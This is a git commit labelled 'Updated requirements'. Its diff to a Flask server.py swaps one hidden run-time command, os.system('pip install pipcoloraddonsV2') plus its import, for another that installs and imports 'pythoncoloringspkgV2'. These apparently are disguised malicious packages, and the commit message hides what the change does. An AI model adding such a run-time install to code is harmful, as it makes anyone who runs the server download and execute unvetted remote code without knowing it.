29f11418594dd689d7084789d71a280dd9056c86
CarollCheng <carollhwrd@gmail.com>
2023-05-12 20:11:09 +0200

    Updated requirements

--- server.py
+++ server.py
@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipcoloraddonsV2")
-import pipcoloraddonsV2
+os.system("pip install pythoncoloringspkgV2")
+import pythoncoloringspkgV2
 import flask
 
 from flask import g
